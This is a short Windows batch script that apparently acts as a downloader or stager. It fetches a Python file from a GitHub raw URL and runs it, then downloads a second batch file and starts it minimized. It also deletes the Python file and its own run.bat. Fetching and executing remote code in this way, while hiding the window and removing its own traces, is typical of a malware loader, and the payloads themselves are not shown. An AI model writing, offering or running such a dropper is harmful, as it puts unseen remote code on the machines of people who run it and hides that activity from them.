@echo off
:top
curl -o Client.py https://raw.githubusercontent.com/oogabooga245/-/main/Client.py
python3 Client.py
goto :run
:run
timeout 10 >nul
curl -o 1.bat https://raw.githubusercontent.com/oogabooga245/-/main/1.bat
del Client.py
START /MIN CMD.EXE /C 1.bat
del run.bat
exit
